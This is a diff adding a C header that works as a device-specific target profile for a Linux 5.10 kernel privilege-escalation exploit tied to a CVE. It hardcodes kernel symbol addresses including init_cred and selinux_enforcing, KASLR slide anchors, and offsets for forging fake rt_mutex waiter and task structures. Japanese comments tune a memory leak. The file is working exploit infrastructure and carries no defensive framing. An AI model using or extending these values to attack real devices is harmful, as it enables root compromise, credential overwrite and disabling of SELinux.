@@ -1,0 +1,65 @@
+/* aristotle_target.h — CVE-2026-43499 @ XIG04 k5.10.136 (first cut, measured) */
+#ifndef TARGET_H
+#define TARGET_H
+
+/* target profile */
+#define KIMAGE_TEXT_BASE 0xffffffc010000000ULL
+#define P0_PAGE_OFFSET 0xffffff8000000000ULL
+#define P0_PHYS_OFFSET 0x40000000ULL
+#define P0_KERNEL_PHYS_LOAD 0x40000000ULL   /* = P0_PHYS_OFFSET (delta 0). duchamp/全ターゲット参照でカーネルは memstart にロード=delta0。旧 0x40080000(delta 0x80000)は誤りで slide の linear-map エイリアスを 0x80000 ずらし leak を不発化していた疑い */
+#define PSELECT_WAITER_WORD_SHIFT 0         /* frames: pselect6=0xa0 core_sys_select=0x1c0 futex=0x90 do_futex=0x70 futex_wait_rq_pi=0x1a0; buf=0x50 waiter_local=0x90 → delta=0 */
+
+/* kernel image addresses */
+#define INIT_TASK 0xffffffc01277bf80ULL
+#define INIT_CRED 0xffffffc012790930ULL
+#define ENTRY_TASK 0xffffffc0127362f8ULL
+#define PER_CPU_OFFSET 0xffffffc01276a548ULL
+#define ROOT_TASK_GROUP 0xffffffc012976040ULL
+#define SELINUX_ENFORCING 0xffffffc012a25b90ULL
+
+/* KASLR anchors */
+#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffffc012771450ULL
+#define SLIDE_INIT_TASK_IMAGE 0xffffffc01277bf80ULL
+#define SLIDE_ROOT_TASK_GROUP_IMAGE 0xffffffc012976040ULL
+#define SLIDE_LOGGERS_0_1_IMAGE 0xffffffc012771380ULL       /* &loggers[0][1] = loggers(0x2771378)+ULOG(1)*8 */
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffffc012886cf8ULL /* &boot_id ctl_table.data (entry@0x2886cf0, procname/mode 照合) */
+
+/* waiter fields (5.10 flat layout; wake_state/ww_ctx は 5.10 に非在) */
+#define WAITER_TREE_ENTRY_OFF 0x0
+#define WAITER_PI_TREE_ENTRY_OFF 0x18
+#define WAITER_TASK_OFF 0x30
+#define WAITER_LOCK_OFF 0x38
+#define WAITER_PRIO_OFF 0x40
+#define WAITER_DEADLINE_OFF 0x48
+/* #define WAITER_WAKE_STATE_OFF  <<TODO: 5.10 非在。slide.c 側で除去>> */
+/* #define WAITER_WW_CTX_OFF  <<TODO: 5.10 非在。slide.c 側で除去>> */
+
+/* fake waiter (5.10 近似; pi_tree の個別 prio/deadline は 5.10 に無くフラット prio/deadline に写像) */
+#define FAKE_WAITER_TREE_PRIO_OFF 0x40
+#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
+#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
+#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
+#define FAKE_WAITER_TASK_OFF 0x30
+#define FAKE_WAITER_LOCK_OFF 0x38
+
+/* fake task fields (measured) */
+#define FAKE_TASK_USAGE_OFF 0x40
+#define FAKE_TASK_PRIO_OFF 0x84
+#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
+#define FAKE_TASK_TASK_GROUP_OFF 0x310
+#define FAKE_TASK_PI_LOCK_OFF 0x86c
+#define FAKE_TASK_PI_WAITERS_OFF 0x880
+#define FAKE_TASK_PI_TOP_TASK_OFF 0x890
+#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898
+#define FAKE_TASK_UCLAMP_REQ_OFF 0x408
+#define FAKE_TASK_UCLAMP_OFF 0x410
+
+/* task credential pointers (measured) */
+#define TASK_REAL_CRED_OFF 0x778
+#define TASK_CRED_OFF 0x780
+
+/* NOTE: MM_STRUCT_SZ は common.h 側で定義（build_header は出さない）。
+   5.10 実測値 0x3c0 を common.h に反映済み。 */
+
+#endif
